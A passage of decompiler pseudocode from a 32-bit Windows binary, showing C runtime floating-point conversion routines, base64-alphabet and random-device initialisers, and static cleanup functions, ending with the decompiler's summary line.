      goto LABEL_3;
  }
  else
  {
    if ( v3 == 1 )
    {
LABEL_3:
      if ( v9 )
        *(_DWORD *)(v8 + 112) &= ~2u;
      return 3;
    }
    if ( v3 == 2 )
    {
LABEL_8:
      if ( v9 )
        *(_DWORD *)(v8 + 112) &= ~2u;
      return 4;
    }
  }
  if ( v9 )
    *(_DWORD *)(v8 + 112) &= ~2u;
  return 0;
}
// 412CA8: using guessed type _DWORD __cdecl __strgtold12_l(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 411D2D: using guessed type char var_28[4];
// 411D2D: using guessed type unsigned __int16 var_10[6];

//----- (00411DD5) --------------------------------------------------------
int __cdecl sub_411DD5(_DWORD *a1, int a2, struct localeinfo_struct *a3)
{
  int v3; // eax
  char v6[4]; // [esp+Ch] [ebp-28h] BYREF
  char v7[8]; // [esp+10h] [ebp-24h] BYREF
  int v8; // [esp+18h] [ebp-1Ch]
  char v9; // [esp+1Ch] [ebp-18h]
  int v10; // [esp+20h] [ebp-14h]
  unsigned __int16 v11[6]; // [esp+24h] [ebp-10h] BYREF

  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v7, a3);
  v10 = __strgtold12_l(v11, v6, a2, 0, 0, 0, 0, v7);
  v3 = sub_412757(v11, a1);
  if ( (v10 & 3) != 0 )
  {
    if ( (v10 & 1) != 0 )
      goto LABEL_8;
    if ( (v10 & 2) != 0 )
      goto LABEL_3;
  }
  else
  {
    if ( v3 == 1 )
    {
LABEL_3:
      if ( v9 )
        *(_DWORD *)(v8 + 112) &= ~2u;
      return 3;
    }
    if ( v3 == 2 )
    {
LABEL_8:
      if ( v9 )
        *(_DWORD *)(v8 + 112) &= ~2u;
      return 4;
    }
  }
  if ( v9 )
    *(_DWORD *)(v8 + 112) &= ~2u;
  return 0;
}
// 412CA8: using guessed type _DWORD __cdecl __strgtold12_l(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 411DD5: using guessed type char var_28[4];
// 411DD5: using guessed type unsigned __int16 var_10[6];

//----- (00412206) --------------------------------------------------------
int __cdecl sub_412206(unsigned __int16 *a1, _DWORD *a2)
{
  unsigned __int16 v2; // bx
  int v3; // ebx
  int v4; // eax
  int v5; // ebx
  int v6; // eax
  int result; // eax
  int v8; // edi
  int *v9; // esi
  int v10; // eax
  bool i; // zf
  int v12; // eax
  unsigned int v13; // edx
  int *v14; // ecx
  bool v15; // cf
  unsigned int v16; // edi
  int v17; // eax
  int v18; // edx
  int *v19; // ebx
  int v20; // edx
  int *v21; // ecx
  int v22; // esi
  int v23; // eax
  int *v24; // ebx
  bool n; // zf
  int v26; // eax
  unsigned int v27; // edx
  int *v28; // ecx
  unsigned int v29; // edi
  int ii; // ecx
  int *v31; // ecx
  unsigned int v32; // esi
  int v33; // edi
  int v34; // eax
  int v35; // edx
  int *v36; // ebx
  int v37; // edx
  int *v38; // ecx
  int v39; // eax
  int v40; // edx
  int *v41; // ebx
  int v42; // edx
  int *v43; // ecx
  int v44; // eax
  int v45; // edx
  int v46; // edx
  int *v47; // ecx
  unsigned int v48; // ebx
  int v49; // edx
  int v50; // [esp+8h] [ebp-38h]
  char v51; // [esp+10h] [ebp-30h]
  int v52; // [esp+10h] [ebp-30h]
  int v53; // [esp+14h] [ebp-2Ch]
  int v54; // [esp+14h] [ebp-2Ch]
  char v55; // [esp+14h] [ebp-2Ch]
  int v56; // [esp+14h] [ebp-2Ch]
  int v57; // [esp+14h] [ebp-2Ch]
  int v58; // [esp+14h] [ebp-2Ch]
  int v59; // [esp+18h] [ebp-28h]
  int v60; // [esp+18h] [ebp-28h]
  int v61; // [esp+18h] [ebp-28h]
  int v62; // [esp+18h] [ebp-28h]
  int v63; // [esp+18h] [ebp-28h]
  int v64; // [esp+18h] [ebp-28h]
  int v65; // [esp+1Ch] [ebp-24h]
  unsigned int v66; // [esp+20h] [ebp-20h]
  int m; // [esp+20h] [ebp-20h]
  int jj; // [esp+20h] [ebp-20h]
  int k; // [esp+20h] [ebp-20h]
  int j; // [esp+20h] [ebp-20h]
  int v71; // [esp+24h] [ebp-1Ch]
  int v72; // [esp+28h] [ebp-18h]
  int v73; // [esp+2Ch] [ebp-14h]
  int v74; // [esp+30h] [ebp-10h] BYREF
  int v75; // [esp+34h] [ebp-Ch]
  int v76; // [esp+38h] [ebp-8h] BYREF

  v2 = a1[5];
  v50 = v2 & 0x8000;
  v74 = *(_DWORD *)(a1 + 3);
  v3 = (v2 & 0x7FFF) - 0x3FFF;
  v4 = *a1 << 16;
  v75 = *(_DWORD *)(a1 + 1);
  v76 = v4;
  if ( v3 != -16383 )
  {
    v65 = 0;
    v71 = v74;
    v72 = v75;
    v73 = v76;
    v8 = dword_41BF38 - 1;
    v53 = v3;
    v59 = dword_41BF38 / 32;
    v9 = &v74 + dword_41BF38 / 32;
    v51 = 31 - dword_41BF38 % 32;
    if ( ((1 << v51) & *v9) != 0 )
    {
      v10 = dword_41BF38 / 32;
      for ( i = (~(-1 << (31 - dword_41BF38 % 32)) & *(&v74 + v59)) == 0; i; i = *(&v74 + v10) == 0 )
      {
        if ( ++v10 >= 3 )
          goto LABEL_21;
      }
      v12 = v8 / 32;
      v65 = 0;
      v13 = 1 << (31 - v8 % 32);
      v14 = &v74 + v8 / 32;
      v66 = v13 + *v14;
      if ( v66 >= *v14 )
      {
        v15 = v66 < v13;
        goto LABEL_18;
      }
LABEL_19:
      v65 = 1;
      while ( 1 )
      {
        --v12;
        *v14 = v66;
        if ( v12 < 0 || !v65 )
          break;
        v65 = 0;
        v14 = &v74 + v12;
        v16 = *v14 + 1;
        v66 = v16;
        if ( v16 >= *v14 )
        {
          v15 = v16 == 0;
LABEL_18:
          if ( !v15 )
            continue;
        }
        goto LABEL_19;
      }
    }
LABEL_21:
    *v9 &= -1 << v51;
    if ( v59 + 1 < 3 )
      memset(&v74 + v59 + 1, 0, 4 * (3 - (v59 + 1)));
    if ( v65 )
      ++v3;
    if ( v3 >= dword_41BF34 - dword_41BF38 )
    {
      if ( v3 > dword_41BF34 )
      {
        if ( v3 < dword_41BF30 )
        {
          v5 = dword_41BF44 + v3;
          v74 &= ~0x80000000;
          v44 = dword_41BF3C / 32;
          v45 = dword_41BF3C % 32;
          v64 = 0;
          for ( j = 0; j < 3; ++j )
          {
            v58 = ~(-1 << v45) & *(&v74 + j);
            *(&v74 + j) = v64 | ((unsigned int)*(&v74 + j) >> v45);
            v64 = v58 << (32 - v45);
          }
          v46 = 2;
          v47 = &v76 - v44;
          do
          {
            if ( v46 < v44 )
              *(&v74 + v46) = 0;
            else
              *(&v74 + v46) = *v47;
            --v47;
            --v46;
          }
          while ( v46 >= 0 );
          result = 0;
        }
        else
        {
          v75 = 0;
          v76 = 0;
          v74 = 0x80000000;
          v39 = dword_41BF3C / 32;
          v40 = dword_41BF3C % 32;
          v63 = 0;
          for ( k = 0; k < 3; ++k )
          {
            v41 = &v74 + k;
            v57 = ~(-1 << v40) & *v41;
            *v41 = v63 | ((unsigned int)*v41 >> v40);
            v63 = v57 << (32 - v40);
          }
          v42 = 2;
          v43 = &v76 - v39;
          do
          {
            if ( v42 < v39 )
              *(&v74 + v42) = 0;
            else
              *(&v74 + v42) = *v43;
            --v43;
            --v42;
          }
          while ( v42 >= 0 );
          v5 = dword_41BF30 + dword_41BF44;
          result = 1;
        }
        goto LABEL_78;
      }
      v74 = v71;
      v75 = v72;
      v17 = (dword_41BF34 - v53) / 32;
      v76 = v73;
      v18 = (dword_41BF34 - v53) % 32;
      v60 = 0;
      for ( m = 0; m < 3; ++m )
      {
        v19 = &v74 + m;
        v54 = ~(-1 << v18) & *v19;
        *v19 = v60 | ((unsigned int)*v19 >> v18);
        v60 = v54 << (32 - v18);
      }
      v20 = 2;
      v21 = &v76 - v17;
      do
      {
        if ( v20 < v17 )
          *(&v74 + v20) = 0;
        else
          *(&v74 + v20) = *v21;
        --v21;
        --v20;
      }
      while ( v20 >= 0 );
      v22 = dword_41BF38 - 1;
      v23 = dword_41BF38 / 32;
      v52 = dword_41BF38 / 32;
      v24 = &v74 + dword_41BF38 / 32;
      v55 = 31 - dword_41BF38 % 32;
      if ( ((1 << v55) & *v24) != 0 )
      {
        for ( n = (~(-1 << (31 - dword_41BF38 % 32)) & *(&v74 + v23)) == 0; n; n = *(&v74 + v23) == 0 )
        {
          if ( ++v23 >= 3 )
            goto LABEL_51;
        }
        v26 = v22 / 32;
        v61 = 0;
        v27 = 1 << (31 - v22 % 32);
        v28 = &v74 + v22 / 32;
        v29 = *v28 + v27;
        if ( v29 < *v28 || v29 < v27 )
          v61 = 1;
        *v28 = v29;
        for ( ii = v61; --v26 >= 0 && ii; ii = v33 )
        {
          v31 = &v74 + v26;
          v32 = *v31 + 1;
          v33 = 0;
          if ( v32 < *v31 || *v31 == -1 )
            v33 = 1;
          *v31 = v32;
        }
      }
LABEL_51:
      *v24 &= -1 << v55;
      if ( v52 + 1 < 3 )
        memset(&v74 + v52 + 1, 0, 4 * (3 - (v52 + 1)));
      v34 = (dword_41BF3C + 1) / 32;
      v35 = (dword_41BF3C + 1) % 32;
      v62 = 0;
      for ( jj = 0; jj < 3; ++jj )
      {
        v36 = &v74 + jj;
        v56 = ~(-1 << v35) & *v36;
        *v36 = v62 | ((unsigned int)*v36 >> v35);
        v62 = v56 << (32 - v35);
      }
      v37 = 2;
      v38 = &v76 - v34;
      do
      {
        if ( v37 < v34 )
          *(&v74 + v37) = 0;
        else
          *(&v74 + v37) = *v38;
        --v38;
        --v37;
      }
      while ( v37 >= 0 );
    }
    else
    {
      v74 = 0;
      v75 = 0;
      v76 = 0;
    }
    v5 = 0;
    result = 2;
    goto LABEL_78;
  }
  v5 = 0;
  v6 = 0;
  while ( !*(&v74 + v6) )
  {
    if ( ++v6 >= 3 )
    {
      result = 0;
      goto LABEL_78;
    }
  }
  v74 = 0;
  v75 = 0;
  v76 = 0;
  result = 2;
LABEL_78:
  v48 = v74 | (v50 != 0 ? 0x80000000 : 0) | (v5 << (31 - dword_41BF3C));
  if ( dword_41BF40 == 64 )
  {
    v49 = v75;
    a2[1] = v48;
    *a2 = v49;
  }
  else if ( dword_41BF40 == 32 )
  {
    *a2 = v48;
  }
  return result;
}
// 41BF30: using guessed type int dword_41BF30;
// 41BF34: using guessed type int dword_41BF34;
// 41BF38: using guessed type int dword_41BF38;
// 41BF3C: using guessed type int dword_41BF3C;
// 41BF40: using guessed type int dword_41BF40;
// 41BF44: using guessed type int dword_41BF44;

//----- (00412757) --------------------------------------------------------
int __cdecl sub_412757(unsigned __int16 *a1, _DWORD *a2)
{
  unsigned __int16 v2; // bx
  int v3; // ebx
  int v4; // eax
  int v5; // ebx
  int v6; // eax
  int result; // eax
  int v8; // edi
  int *v9; // esi
  int v10; // eax
  bool i; // zf
  int v12; // eax
  unsigned int v13; // edx
  int *v14; // ecx
  bool v15; // cf
  unsigned int v16; // edi
  int v17; // eax
  int v18; // edx
  int *v19; // ebx
  int v20; // edx
  int *v21; // ecx
  int v22; // esi
  int v23; // eax
  int *v24; // ebx
  bool n; // zf
  int v26; // eax
  unsigned int v27; // edx
  int *v28; // ecx
  unsigned int v29; // edi
  int ii; // ecx
  int *v31; // ecx
  unsigned int v32; // esi
  int v33; // edi
  int v34; // eax
  int v35; // edx
  int *v36; // ebx
  int v37; // edx
  int *v38; // ecx
  int v39; // eax
  int v40; // edx
  int *v41; // ebx
  int v42; // edx
  int *v43; // ecx
  int v44; // eax
  int v45; // edx
  int v46; // edx
  int *v47; // ecx
  unsigned int v48; // ebx
  int v49; // edx
  int v50; // [esp+8h] [ebp-38h]
  char v51; // [esp+10h] [ebp-30h]
  int v52; // [esp+10h] [ebp-30h]
  int v53; // [esp+14h] [ebp-2Ch]
  int v54; // [esp+14h] [ebp-2Ch]
  char v55; // [esp+14h] [ebp-2Ch]
  int v56; // [esp+14h] [ebp-2Ch]
  int v57; // [esp+14h] [ebp-2Ch]
  int v58; // [esp+14h] [ebp-2Ch]
  int v59; // [esp+18h] [ebp-28h]
  int v60; // [esp+18h] [ebp-28h]
  int v61; // [esp+18h] [ebp-28h]
  int v62; // [esp+18h] [ebp-28h]
  int v63; // [esp+18h] [ebp-28h]
  int v64; // [esp+18h] [ebp-28h]
  int v65; // [esp+1Ch] [ebp-24h]
  unsigned int v66; // [esp+20h] [ebp-20h]
  int m; // [esp+20h] [ebp-20h]
  int jj; // [esp+20h] [ebp-20h]
  int k; // [esp+20h] [ebp-20h]
  int j; // [esp+20h] [ebp-20h]
  int v71; // [esp+24h] [ebp-1Ch]
  int v72; // [esp+28h] [ebp-18h]
  int v73; // [esp+2Ch] [ebp-14h]
  int v74; // [esp+30h] [ebp-10h] BYREF
  int v75; // [esp+34h] [ebp-Ch]
  int v76; // [esp+38h] [ebp-8h] BYREF

  v2 = a1[5];
  v50 = v2 & 0x8000;
  v74 = *(_DWORD *)(a1 + 3);
  v3 = (v2 & 0x7FFF) - 0x3FFF;
  v4 = *a1 << 16;
  v75 = *(_DWORD *)(a1 + 1);
  v76 = v4;
  if ( v3 != -16383 )
  {
    v65 = 0;
    v71 = v74;
    v72 = v75;
    v73 = v76;
    v8 = dword_41BF50 - 1;
    v53 = v3;
    v59 = dword_41BF50 / 32;
    v9 = &v74 + dword_41BF50 / 32;
    v51 = 31 - dword_41BF50 % 32;
    if ( ((1 << v51) & *v9) != 0 )
    {
      v10 = dword_41BF50 / 32;
      for ( i = (~(-1 << (31 - dword_41BF50 % 32)) & *(&v74 + v59)) == 0; i; i = *(&v74 + v10) == 0 )
      {
        if ( ++v10 >= 3 )
          goto LABEL_21;
      }
      v12 = v8 / 32;
      v65 = 0;
      v13 = 1 << (31 - v8 % 32);
      v14 = &v74 + v8 / 32;
      v66 = v13 + *v14;
      if ( v66 >= *v14 )
      {
        v15 = v66 < v13;
        goto LABEL_18;
      }
LABEL_19:
      v65 = 1;
      while ( 1 )
      {
        --v12;
        *v14 = v66;
        if ( v12 < 0 || !v65 )
          break;
        v65 = 0;
        v14 = &v74 + v12;
        v16 = *v14 + 1;
        v66 = v16;
        if ( v16 >= *v14 )
        {
          v15 = v16 == 0;
LABEL_18:
          if ( !v15 )
            continue;
        }
        goto LABEL_19;
      }
    }
LABEL_21:
    *v9 &= -1 << v51;
    if ( v59 + 1 < 3 )
      memset(&v74 + v59 + 1, 0, 4 * (3 - (v59 + 1)));
    if ( v65 )
      ++v3;
    if ( v3 >= dword_41BF4C - dword_41BF50 )
    {
      if ( v3 > dword_41BF4C )
      {
        if ( v3 < dword_41BF48 )
        {
          v5 = dword_41BF5C + v3;
          v74 &= ~0x80000000;
          v44 = dword_41BF54 / 32;
          v45 = dword_41BF54 % 32;
          v64 = 0;
          for ( j = 0; j < 3; ++j )
          {
            v58 = ~(-1 << v45) & *(&v74 + j);
            *(&v74 + j) = v64 | ((unsigned int)*(&v74 + j) >> v45);
            v64 = v58 << (32 - v45);
          }
          v46 = 2;
          v47 = &v76 - v44;
          do
          {
            if ( v46 < v44 )
              *(&v74 + v46) = 0;
            else
              *(&v74 + v46) = *v47;
            --v47;
            --v46;
          }
          while ( v46 >= 0 );
          result = 0;
        }
        else
        {
          v75 = 0;
          v76 = 0;
          v74 = 0x80000000;
          v39 = dword_41BF54 / 32;
          v40 = dword_41BF54 % 32;
          v63 = 0;
          for ( k = 0; k < 3; ++k )
          {
            v41 = &v74 + k;
            v57 = ~(-1 << v40) & *v41;
            *v41 = v63 | ((unsigned int)*v41 >> v40);
            v63 = v57 << (32 - v40);
          }
          v42 = 2;
          v43 = &v76 - v39;
          do
          {
            if ( v42 < v39 )
              *(&v74 + v42) = 0;
            else
              *(&v74 + v42) = *v43;
            --v43;
            --v42;
          }
          while ( v42 >= 0 );
          v5 = dword_41BF48 + dword_41BF5C;
          result = 1;
        }
        goto LABEL_78;
      }
      v74 = v71;
      v75 = v72;
      v17 = (dword_41BF4C - v53) / 32;
      v76 = v73;
      v18 = (dword_41BF4C - v53) % 32;
      v60 = 0;
      for ( m = 0; m < 3; ++m )
      {
        v19 = &v74 + m;
        v54 = ~(-1 << v18) & *v19;
        *v19 = v60 | ((unsigned int)*v19 >> v18);
        v60 = v54 << (32 - v18);
      }
      v20 = 2;
      v21 = &v76 - v17;
      do
      {
        if ( v20 < v17 )
          *(&v74 + v20) = 0;
        else
          *(&v74 + v20) = *v21;
        --v21;
        --v20;
      }
      while ( v20 >= 0 );
      v22 = dword_41BF50 - 1;
      v23 = dword_41BF50 / 32;
      v52 = dword_41BF50 / 32;
      v24 = &v74 + dword_41BF50 / 32;
      v55 = 31 - dword_41BF50 % 32;
      if ( ((1 << v55) & *v24) != 0 )
      {
        for ( n = (~(-1 << (31 - dword_41BF50 % 32)) & *(&v74 + v23)) == 0; n; n = *(&v74 + v23) == 0 )
        {
          if ( ++v23 >= 3 )
            goto LABEL_51;
        }
        v26 = v22 / 32;
        v61 = 0;
        v27 = 1 << (31 - v22 % 32);
        v28 = &v74 + v22 / 32;
        v29 = *v28 + v27;
        if ( v29 < *v28 || v29 < v27 )
          v61 = 1;
        *v28 = v29;
        for ( ii = v61; --v26 >= 0 && ii; ii = v33 )
        {
          v31 = &v74 + v26;
          v32 = *v31 + 1;
          v33 = 0;
          if ( v32 < *v31 || *v31 == -1 )
            v33 = 1;
          *v31 = v32;
        }
      }
LABEL_51:
      *v24 &= -1 << v55;
      if ( v52 + 1 < 3 )
        memset(&v74 + v52 + 1, 0, 4 * (3 - (v52 + 1)));
      v34 = (dword_41BF54 + 1) / 32;
      v35 = (dword_41BF54 + 1) % 32;
      v62 = 0;
      for ( jj = 0; jj < 3; ++jj )
      {
        v36 = &v74 + jj;
        v56 = ~(-1 << v35) & *v36;
        *v36 = v62 | ((unsigned int)*v36 >> v35);
        v62 = v56 << (32 - v35);
      }
      v37 = 2;
      v38 = &v76 - v34;
      do
      {
        if ( v37 < v34 )
          *(&v74 + v37) = 0;
        else
          *(&v74 + v37) = *v38;
        --v38;
        --v37;
      }
      while ( v37 >= 0 );
    }
    else
    {
      v74 = 0;
      v75 = 0;
      v76 = 0;
    }
    v5 = 0;
    result = 2;
    goto LABEL_78;
  }
  v5 = 0;
  v6 = 0;
  while ( !*(&v74 + v6) )
  {
    if ( ++v6 >= 3 )
    {
      result = 0;
      goto LABEL_78;
    }
  }
  v74 = 0;
  v75 = 0;
  v76 = 0;
  result = 2;
LABEL_78:
  v48 = v74 | (v50 != 0 ? 0x80000000 : 0) | (v5 << (31 - dword_41BF54));
  if ( dword_41BF58 == 64 )
  {
    v49 = v75;
    a2[1] = v48;
    *a2 = v49;
  }
  else if ( dword_41BF58 == 32 )
  {
    *a2 = v48;
  }
  return result;
}
// 41BF48: using guessed type int dword_41BF48;
// 41BF4C: using guessed type int dword_41BF4C;
// 41BF50: using guessed type int dword_41BF50;
// 41BF54: using guessed type int dword_41BF54;
// 41BF58: using guessed type int dword_41BF58;
// 41BF5C: using guessed type int dword_41BF5C;

//----- (00414480) --------------------------------------------------------
void sub_414480()
{
  std::tr1 *v0; // [esp+0h] [ebp-34h]
  void *v1[5]; // [esp+Ch] [ebp-28h] BYREF
  unsigned int v2; // [esp+20h] [ebp-14h]
  int v3; // [esp+30h] [ebp-4h]

  v2 = 15;
  v1[4] = 0;
  LOBYTE(v1[0]) = 0;
  sub_401330(&unk_41744C, 0, (int)v1);
  v3 = 0;
  std::tr1::_Random_device(v0);
  if ( v2 >= 0x10 )
    operator delete(v1[0]);
}
// 4144CB: variable 'v0' is possibly undefined

//----- (00414500) --------------------------------------------------------
int sub_414500()
{
  sub_401330("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", 0x40u, (int)&dword_41BEC8);
  return atexit(sub_4145E0);
}

//----- (00414530) --------------------------------------------------------
int sub_414530()
{
  sub_401330("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", 0x40u, (int)&Buf);
  return atexit(sub_414610);
}

//----- (00414560) --------------------------------------------------------
void sub_414560()
{
  std::tr1 *v0; // [esp+0h] [ebp-34h]
  void *v1[5]; // [esp+Ch] [ebp-28h] BYREF
  unsigned int v2; // [esp+20h] [ebp-14h]
  int v3; // [esp+30h] [ebp-4h]

  v2 = 15;
  v1[4] = 0;
  LOBYTE(v1[0]) = 0;
  sub_401330(&unk_41744C, 0, (int)v1);
  v3 = 0;
  std::tr1::_Random_device(v0);
  if ( v2 >= 0x10 )
    operator delete(v1[0]);
}
// 4145AB: variable 'v0' is possibly undefined

//----- (004145E0) --------------------------------------------------------
void __cdecl sub_4145E0()
{
  if ( (unsigned int)dword_41BEDC >= 0x10 )
    operator delete(dword_41BEC8);
  dword_41BEDC = 15;
  dword_41BED8 = 0;
  LOBYTE(dword_41BEC8) = 0;
}
// 41BED8: using guessed type int dword_41BED8;
// 41BEDC: using guessed type int dword_41BEDC;

//----- (00414610) --------------------------------------------------------
void __cdecl sub_414610()
{
  if ( (unsigned int)dword_41BEF8 >= 0x10 )
    operator delete(Buf);
  dword_41BEF8 = 15;
  dword_41BEF4 = 0;
  LOBYTE(Buf) = 0;
}
// 41BEF4: using guessed type int dword_41BEF4;
// 41BEF8: using guessed type int dword_41BEF8;

//----- (0041463E) --------------------------------------------------------
void __cdecl sub_41463E()
{
  dword_41C240[0] = &std::bad_alloc::`vftable';
  sub_406AA9((std::exception *)dword_41C240);
}
// 41522C: using guessed type void *std::bad_alloc::`vftable';
// 41C240: using guessed type _DWORD dword_41C240[3];

// nfuncs=391 queued=91 decompiled=91 lumina nreq=0 worse=0 better=0
// ALL OK, 91 function(s) have been successfully decompiled
